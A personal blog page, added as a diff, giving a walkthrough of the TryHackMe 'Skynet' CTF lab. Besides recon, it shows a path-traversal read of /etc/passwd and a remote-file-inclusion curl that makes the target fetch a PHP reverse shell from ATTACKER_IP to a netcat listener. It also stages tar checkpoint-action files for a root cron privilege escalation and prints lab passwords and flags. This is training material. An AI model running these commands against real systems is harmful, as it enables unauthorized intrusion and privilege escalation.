@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Skynet | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF: SMB anonymous access, Burp Intruder wordlist crack on Squirrelmail, email-leaked Samba creds, Cuppa CMS LFI to RFI reverse shell, tar wildcard cron abuse to root.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/skynet.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/skynet.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Skynet">
+<meta property="og:description" content="TryHackMe CTF: SMB anonymous access, Burp Intruder wordlist crack on Squirrelmail, email-leaked Samba creds, Cuppa CMS LFI to RFI reverse shell, tar wildcard cron abuse to root.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Skynet">
+<meta name="twitter:description" content="TryHackMe CTF: SMB anonymous access, Burp Intruder wordlist crack on Squirrelmail, email-leaked Samba creds, Cuppa CMS LFI to RFI reverse shell, tar wildcard cron abuse to root.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Skynet</h1>
+    <div class="post-description">TryHackMe CTF. A vulnerable Terminator themed Linux machine. Hasta la vista, baby.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>A vulnerable Terminator themed Linux machine. Hasta la vista, baby.</p>
+
+<hr>
+
+<h2>Recon</h2>
+
+<p>Two Nmap scans running in parallel. A detailed vuln scan:</p>
+
+<pre><code class="language-bash">nmap -sS -Pn -sC -sV --script=vuln -T4 TARGET_IP -oA skynet_nmap_result.txt</code></pre>
+
+<p>And a lighter pass to start mapping enumeration paths while the first runs:</p>
+
+<pre><code class="language-bash">nmap -sV -sC -p- -T4 TARGET_IP</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 8.35.51 PM.png" alt="nmap results showing SSH, HTTP, POP3, IMAP, and Samba ports open" style="max-width:100%;margin:2rem 0;">
+
+<p>Not a bad assortment of ports and services to work with.</p>
+
+<p><strong>Open ports:</strong></p>
+<ul>
+<li>22 SSH (OpenSSH)</li>
+<li>80 HTTP (Apache 2.4.18, title: Skynet)</li>
+<li>110 POP3 (Dovecot)</li>
+<li>139 NetBIOS (Samba, workgroup: Skynet)</li>
+<li>143 IMAP (Dovecot)</li>
+<li>445 NetBIOS (Samba, workgroup: Skynet)</li>
+</ul>
+
+<p>HTTP didn&rsquo;t fingerprint much in the vuln scan, which is uncommon. More on that in a moment.</p>
+
+<p>(Schwarzenegger voice) &hellip;I&rsquo;ll be back.</p>
+
+<p>It had to be done. Leave me alone.</p>
+
+<p>In-browser:</p>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 9.08.03 PM.png" alt="Skynet homepage in browser" style="max-width:100%;margin:2rem 0;">
+
+<p>We definitely have a Google copyright infringement, but I&rsquo;ll save that for my spare time.</p>
+
+<p>Time to enumerate directories via feroxbuster:</p>
+
+<pre><code class="language-bash">feroxbuster -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 9.26.04 PM.png" alt="feroxbuster output showing /admin/, /ai/, and /squirrelmail/ returning 301" style="max-width:100%;margin:2rem 0;">
+
+<p>While it runs, notable finds so far:</p>
+<ul>
+<li><code>/admin/</code> serving 301</li>
+<li><code>/ai/</code> serving 301</li>
+<li><code>/squirrelmail/</code> serving 301</li>
+</ul>
+
+<p>I&rsquo;m familiar with Squirrelmail. When I bought my first domain from MyDomain.com (RIP), their free email service was Squirrelmail. Archaic and nostalgic even up to around 2020. I thought I was just waxing poetic down memory lane, but I&rsquo;m going to take a walk that way instead.</p>
+
+<p><code>http://TARGET_IP/squirrelmail</code> resolves to:</p>
+
+<pre><code>http://TARGET_IP/squirrelmail/src/login.php</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 9.57.55 PM.png" alt="Squirrelmail login page at /squirrelmail/src/login.php" style="max-width:100%;margin:2rem 0;">
+
+<p>I&rsquo;m quite proud of myself.</p>
+
+<p>No credentials yet, so SMB is the next service to investigate. Treasure usually lies within.</p>
+
+<hr>
+
+<h2>SMB enumeration</h2>
+
+<pre><code class="language-bash">nmap -sS --script /usr/share/nmap/scripts/smb-enum-shares.nse -p 139,445 TARGET_IP</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 10.16.49 PM.png" alt="nmap SMB enumeration showing four shares including anonymous and milesdyson" style="max-width:100%;margin:2rem 0;">
+
+<p>Well, well. Hello there, Miles. Can&rsquo;t talk now. I&rsquo;m en-route to pwn you.</p>
+
+<p>Four SMB shares, two with anonymous access, and a share belonging to Miles whose password we need. Let&rsquo;s see if guest access works:</p>
+
+<pre><code class="language-bash">smbclient //TARGET_IP/anonymous -U guest</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 10.24.18 PM.png" alt="smbclient guest login to anonymous share succeeding" style="max-width:100%;margin:2rem 0;">
+
+<p>I feel like I&rsquo;m waiting for the other shoe to drop. This is feeling a little too easy.</p>
+
+<pre><code class="language-bash">ls</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 10.24.59 PM.png" alt="anonymous share listing showing attention.txt and logs directory" style="max-width:100%;margin:2rem 0;">
+
+<p><code>attention.txt</code> first, then <code>logs</code>.</p>
+
+<pre><code class="language-bash">get attention.txt</code></pre>
+
+<p>Read locally:</p>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 10.28.28 PM.png" alt="attention.txt contents from the anonymous share" style="max-width:100%;margin:2rem 0;">
+
+<p>Hmm. Perhaps we do want <code>logs</code> after all. <code>logs</code> was created about an hour after <code>attention.txt</code>. It may hold rotated credentials.</p>
+
+<pre><code class="language-bash">cd logs
+ls
+get log1.txt</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 10.32.45 PM.png" alt="logs directory listing and log1.txt contents showing a password wordlist" style="max-width:100%;margin:2rem 0;">
+
+<p>We&rsquo;re making a wordlist. The other two log files are empty. Save yourself the trouble.</p>
+
+<hr>
+
+<h2>Cracking Miles&rsquo; email password</h2>
+
+<p>Intercept a login attempt at <code>http://TARGET_IP/squirrelmail/src/login.php</code> in Burp. Set the payload position on the <code>secretkey</code> value, load <code>log1.txt</code> as a Simple List, and start the attack.</p>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 10.39.32 PM.png" alt="Burp Intruder configured with secretkey as payload position and log1.txt as wordlist" style="max-width:100%;margin:2rem 0;">
+
+<p>A <code>200</code> response comes back quickly.</p>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 10.42.13 PM.png" alt="Burp Intruder results showing one 200 response indicating the correct password" style="max-width:100%;margin:2rem 0;">
+
+<p>We&rsquo;re in.</p>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 10.43.02 PM.png" alt="Squirrelmail inbox for milesdyson after successful login" style="max-width:100%;margin:2rem 0;">
+
+<p>Miles, you just got pwned.</p>
+
+<p><strong>Miles&rsquo; email password:</strong> <code>cyborg007haloterminator</code></p>
+
+<hr>
+
+<h2>Miles&rsquo; SMB share</h2>
+
+<p>The first email in his inbox: a Samba password reset.</p>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 10.46.58 PM.png" alt="Miles' inbox email containing his new Samba password" style="max-width:100%;margin:2rem 0;">
+
+<p>Pwned again, sir.</p>
+
+<p>Miles&rsquo; SMB password is nearly all special characters, so we&rsquo;ll use an auth file instead of typing it at the prompt:</p>
+
+<pre><code class="language-bash">nano smbcreds.txt</code></pre>
+
+<pre><code>username=milesdyson
+password=)s{A&amp;2Z=F^n_E.B`
+domain=WORKGROUP</code></pre>
+
+<p>Log in using the auth file:</p>
+
+<pre><code class="language-bash">smbclient //TARGET_IP/milesdyson -A smbcreds.txt</code></pre>
+
+<p>We are in as Miles.</p>
+
+<pre><code class="language-bash">ls
+cd notes
+ls
+get important.txt</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 11.03.39 PM.png" alt="milesdyson SMB share notes directory listing showing important.txt" style="max-width:100%;margin:2rem 0;">
+
+<p>This looks suspiciously like the AI Security section of my Obsidian vault.</p>
+
+<pre><code class="language-bash">cat important.txt</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 11.06.11 PM.png" alt="important.txt revealing a hidden directory path starting with /45kra24zxs28v3yd" style="max-width:100%;margin:2rem 0;">
+
+<p>Credentials aside, this is nearly verbatim from my Obsidian vault. I&rsquo;m sorry, wife. I&rsquo;ll do better.</p>
+
+<p>A beta CMS. A hidden directory with a leading <code>/</code>. Found it.</p>
+
+<p><strong>Hidden directory:</strong> <code>/45kra24zxs28v3yd</code></p>
+
+<hr>
+
+<h2>Cuppa CMS and the LFI</h2>
+
+<p>Visit the hidden directory:</p>
+
+<pre><code>http://TARGET_IP/45kra24zxs28v3yd/</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-04 at 11.11.45 PM.png" alt="hidden directory serving Miles Dyson's personal page" style="max-width:100%;margin:2rem 0;">
+
+<p>Nice to formally meet you, Miles. Now let&rsquo;s see what&rsquo;s behind it.</p>
+
+<pre><code class="language-bash">feroxbuster -u http://TARGET_IP/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</code></pre>
+
+<p><code>/administrator/</code> turns up. In browser, it feels like I&rsquo;m about to enter the POS interface for the coffee shop on Friends.</p>
+
+<p>Metasploit came up short, but searchsploit holds an exploit for Cuppa CMS:</p>
+
+<pre><code class="language-bash">searchsploit -x php/webapps/25971.txt</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-05 at 6.00.33 AM.png" alt="searchsploit exploit detail for Cuppa CMS showing the vulnerable urlConfig parameter" style="max-width:100%;margin:2rem 0;">
+
+<p>The vulnerable line:</p>
+
+<pre><code class="language-php">include($_REQUEST["urlConfig"]);</code></pre>
+
+<p>Whatever value gets passed as <code>urlConfig</code> is included as a PHP file. The vulnerable path is <code>/alerts/alertConfigField.php</code>. The question about remote file inclusion was not subtle foreshadowing.</p>
+
+<p><strong>Confirm LFI first:</strong></p>
+
+<pre><code class="language-bash">curl "http://TARGET_IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd"</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-05 at 6.33.42 AM.png" alt="curl LFI returning /etc/passwd contents" style="max-width:100%;margin:2rem 0;">
+
+<p><code>/etc/passwd</code> in the output. Confirmed.</p>
+
+<hr>
+
+<h2>Reverse shell via RFI</h2>
+
+<p>Copy PentestMonkey&rsquo;s PHP reverse shell into the working directory and edit the IP and port:</p>
+
+<pre><code class="language-bash">cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
+nano shell.php</code></pre>
+
+<p>Set <code>$ip</code> to <code>ATTACKER_IP</code> and <code>$port</code> to <code>1234</code>.</p>
+
+<p>Three terminals:</p>
+
+<pre><code class="language-bash">python3 -m http.server 8000     # terminal 1: serve the shell
+nc -lvnp 1234                    # terminal 2: catch the shell</code></pre>
+
+<p>Terminal 3, trigger the RFI:</p>
+
+<pre><code class="language-bash">curl "http://TARGET_IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://ATTACKER_IP:8000/shell.php"</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-05 at 6.54.49 AM.png" alt="netcat listener catching the reverse shell as www-data" style="max-width:100%;margin:2rem 0;">
+
+<p>Upgrade the shell:</p>
+
+<pre><code class="language-bash">python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+
+<p>This shell is, as the kids would say, mid. But it works.</p>
+
+<pre><code class="language-bash">cat /home/milesdyson/user.txt</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-05 at 7.02.40 AM.png" alt="user.txt flag in milesdyson's home directory" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>User flag:</strong> <code>7ce5c2109a40f958099283600a9ae807</code></p>
+
+<hr>
+
+<h2>Privesc via tar wildcard</h2>
+
+<pre><code class="language-bash">ls -la /home/milesdyson/backups
+cat /home/milesdyson/backups/backup.sh</code></pre>
+
+<p>A root cron job runs <code>tar cf ... *</code> from <code>/var/www/html</code>. GNU tar&rsquo;s <code>--checkpoint-action=exec=COMMAND</code> executes a shell command at checkpoints. If we can name files that look like tar options in that directory, the cron job runs them for us.</p>
+
+<p>Same technique as <a href="/operation-coldstart.html">Operation Coldstart</a>, different path to the writable directory.</p>
+
+<p>Stage the payload in <code>/var/www/html</code>:</p>
+
+<pre><code class="language-bash">echo 'cat /root/root.txt > /tmp/rootflag.txt' > shell.sh
+chmod +x shell.sh
+touch "/var/www/html/--checkpoint=1"
+touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-05 at 7.55.34 AM.png" alt="/var/www/html listing showing shell.sh and the two --checkpoint option files staged" style="max-width:100%;margin:2rem 0;">
+
+<p>Wait 60 seconds for the cron job to fire, then:</p>
+
+<pre><code class="language-bash">cat /tmp/rootflag.txt</code></pre>
+
+<img src="/images/skynet/Screenshot 2026-06-05 at 7.56.56 AM.png" alt="root flag read from /tmp/rootflag.txt after cron fires" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Root flag:</strong> <code>3f0372db24753accc7179a282cd6a949</code></p>
+
+<p>Fin.</p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code class="language-bash"># 1. Recon
+nmap -sV -sC -p- -T4 TARGET_IP
+# 22 SSH, 80 HTTP, 110 POP3, 139/445 SMB (Samba, workgroup: Skynet), 143 IMAP
+
+# 2. Web: feroxbuster finds /squirrelmail
+feroxbuster -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+
+# 3. SMB anonymous access -> attention.txt + log1.txt (wordlist)
+smbclient //TARGET_IP/anonymous -U guest
+get attention.txt
+cd logs &amp;&amp; get log1.txt
+
+# 4. Burp Intruder on squirrelmail login -> cyborg007haloterminator
+# payload position: secretkey, simple list from log1.txt
+
+# 5. Read Miles' email -> Samba password reset
+# SMB as milesdyson -> notes/important.txt -> hidden dir /45kra24zxs28v3yd
+
+# 6. feroxbuster on hidden dir -> /administrator/ (Cuppa CMS)
+# searchsploit Cuppa CMS -> LFI via urlConfig parameter
+curl "http://TARGET_IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd"
+
+# 7. RFI: serve PentestMonkey PHP reverse shell, trigger via urlConfig
+python3 -m http.server 8000
+nc -lvnp 1234
+curl "http://TARGET_IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://ATTACKER_IP:8000/shell.php"
+# -> shell as www-data, upgrade with pty, user.txt
+
+# 8. Privesc: tar wildcard via root cron job in /var/www/html
+echo 'cat /root/root.txt > /tmp/rootflag.txt' > shell.sh
+chmod +x shell.sh
+touch "/var/www/html/--checkpoint=1"
+touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+# wait 60s
+cat /tmp/rootflag.txt</code></pre>
+
+<p>Recap: SMB anonymous access, wordlist from logs, Burp Intruder cracks squirrelmail, email leaks Samba password, milesdyson SMB reveals hidden directory, Cuppa CMS LFI confirmed, RFI delivers reverse shell, tar wildcard cron abuse to root.</p>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
